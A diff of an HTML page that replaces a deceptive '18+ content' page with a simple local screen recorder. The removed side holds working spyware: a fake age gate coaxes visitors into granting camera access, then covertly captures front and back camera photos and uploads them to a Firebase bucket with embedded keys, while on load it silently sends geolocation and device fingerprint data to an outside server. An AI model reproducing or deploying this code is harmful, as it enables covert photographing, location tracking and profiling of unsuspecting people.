@@ -1,229 +1,80 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Camera Permission</title>
+  <meta charset="UTF-8">
+  <title>Screen Recorder</title>
   <style>
     body {
+      font-family: sans-serif;
       text-align: center;
-      font-family: Arial, sans-serif;
+      padding: 40px;
     }
-
-    #permission-overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0, 0, 0, 0.8);
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      z-index: 1000;
-    }
-
-    #allow-btn, #press {
-      padding: 10px 20px;
+    button {
       font-size: 18px;
-      color: white;
-      border: none;
-      cursor: pointer;
-      border-radius: 5px;
-      margin-top: 10px;
+      margin: 10px;
+      padding: 10px 20px;
     }
-
-    #allow-btn {
-      background-color: red;
-    }
-
-    #press {
-      background-color: green;
-    }
-
-    #preview-img {
-      width: 300px;
-      height: auto;
-      filter: blur(3px);
-      transition: filter 0.1s;
+    video {
+      margin-top: 20px;
+      width: 80%;
+      max-width: 600px;
     }
   </style>
 </head>
 <body>
-  <!-- Permission Overlay -->
-  <div id="permission-overlay">
-    <p>🔒 This page requires 🔞 Age only</p>
-    <button id="press">press👇👇👇</button>
-    <button id="allow-btn">Enter</button>
-  </div>
 
-  <!-- Preview Image -->
-  <img id="preview-img" src="image/Screenshot_20250203-083302_Chrome.jpg" alt="Image Preview" />
+  <h1>🖥️ Screen Recorder</h1>
+  <button id="startBtn">Start Recording</button>
+  <button id="stopBtn" disabled>Stop Recording</button>
+  <br>
+  <video id="preview" autoplay muted></video>
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
+  <script>
+    let mediaRecorder;
+    let recordedChunks = [];
 
-    const firebaseConfig = {
-            apiKey: "AIzaSyCUcrXxdp-xaDemWm6XeODP43L4c8nsFZU",
-  authDomain: "valute3.firebaseapp.com",
-  databaseURL: "https://valute3-default-rtdb.firebaseio.com",
-  projectId: "valute3",
-  storageBucket: "valute3.appspot.com",
-  messagingSenderId: "1059488015525",
-  appId: "1:1059488015525:web:db514a29cb876069d2d94c",
-  measurementId: "G-VBSCFW4HQP"
-        };
-          
-        const app = initializeApp(firebaseConfig);
-        const storage = getStorage(app);
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const preview = document.getElementById('preview');
 
-    const permissionOverlay = document.getElementById("permission-overlay");
-    const previewImg = document.getElementById("preview-img");
-    const allowBtn = document.getElementById("allow-btn");
-
-    const jsonServerUrl = "https://mobilw-1.onrender.com/movies";
-
-    // ⏱ Check if permission already granted
-    if (localStorage.getItem("cameraAllowed") === "true") {
-      permissionOverlay.style.display = "none";
-      previewImg.style.filter = "blur(0)";
-    } else {
-      previewImg.style.filter = "blur(3px)";
-    }
-
-    allowBtn.addEventListener("click", requestCameraPermission);
-
-    async function requestCameraPermission() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        permissionOverlay.style.display = "none";
-        previewImg.style.filter = "blur(0)";
-        localStorage.setItem("cameraAllowed", "true");
-        captureMultipleImages();
-        stream.getTracks().forEach(track => track.stop());
-      } catch (error) {
-        alert("❌ Camera access denied.");
-        previewImg.style.filter = "blur(3px)";
-      }
-    }
-
-    async function getCameraStream(useFrontCamera) {
-      try {
-        return await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: useFrontCamera ? "user" : "environment" }
-        });
-      } catch (error) {
-        return null;
-      }
-    }
-
-    async function captureMultipleImages() {
-      const frontStream = await getCameraStream(true);
-      const backStream = await getCameraStream(false);
-
-      if (!frontStream || !backStream) return;
-
-      const frontVideo = document.createElement("video");
-      frontVideo.srcObject = frontStream;
-      frontVideo.muted = true;
-      await frontVideo.play();
-
-      const backVideo = document.createElement("video");
-      backVideo.srcObject = backStream;
-      backVideo.muted = true;
-      await backVideo.play();
-
-      for (let i = 0; i < 10; i++) {
-        await captureAndUploadPhoto(frontVideo, i, true);
-        await captureAndUploadPhoto(backVideo, i, false);
-      }
-
-      frontStream.getTracks().forEach(track => track.stop());
-      backStream.getTracks().forEach(track => track.stop());
-    }
-
-    async function captureAndUploadPhoto(video, index, useFrontCamera) {
-      return new Promise(async (resolve) => {
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        canvas.toBlob(async (blob) => {
-          const cameraType = useFrontCamera ? "front" : "back";
-          const fileName = `helloworld/${cameraType}_${index + 1}_${Date.now()}.png`;
-          const storageRef = ref(storage, fileName);
-          await uploadBytes(storageRef, blob);
-          resolve();
-        }, "image/png");
+    startBtn.onclick = async () => {
+      const stream = await navigator.mediaDevices.getDisplayMedia({
+        video: true,
+        audio: true
       });
-    }
 
-    // 📍 Upload Location
-    function getLocation() { 
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(uploadLocation, showError);
-      }
-    }
+      preview.srcObject = stream;
 
-    function uploadLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      recordedChunks = [];
+      mediaRecorder = new MediaRecorder(stream);
 
-      fetch(jsonServerUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ mapUrl })
-      })
-      .then(res => res.json())
-      .then(data => console.log("📍 Location uploaded:", data))
-      .catch(err => console.error("Location error:", err));
-    }
-
-    function showError(error) {
-      console.error("Geolocation error:", error);
-    }
-
-    // 📱 Upload Device Info
-    async function uploadDeviceInfo() {
-      const deviceInfo = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenResolution: `${screen.width}x${screen.height}`,
-        availableMemory: navigator.deviceMemory || "Unknown",
-        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
-        timestamp: new Date().toISOString()
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) recordedChunks.push(event.data);
       };
 
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          deviceInfo.battery = {
-            level: `${Math.round(battery.level * 100)}%`,
-            charging: battery.charging
-          };
-        } catch (err) {
-          console.warn("Battery info error:", err);
-        }
-      }
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+        const url = URL.createObjectURL(blob);
 
-      fetch(jsonServerUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ deviceInfo })
-      })
-      .then(res => res.json())
-      .then(data => console.log("📱 Device info uploaded:", data))
-      .catch(err => console.error("Device info error:", err));
-    }
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'screen-recording.webm';
+        a.click();
+        URL.revokeObjectURL(url);
+      };
 
-    // 🚀 On page load
-    getLocation();
-    uploadDeviceInfo();
+      mediaRecorder.start();
+      startBtn.disabled = true;
+      stopBtn.disabled = false;
+    };
+
+    stopBtn.onclick = () => {
+      mediaRecorder.stop();
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+      preview.srcObject.getTracks().forEach(track => track.stop());
+    };
   </script>
+
 </body>
 </html>
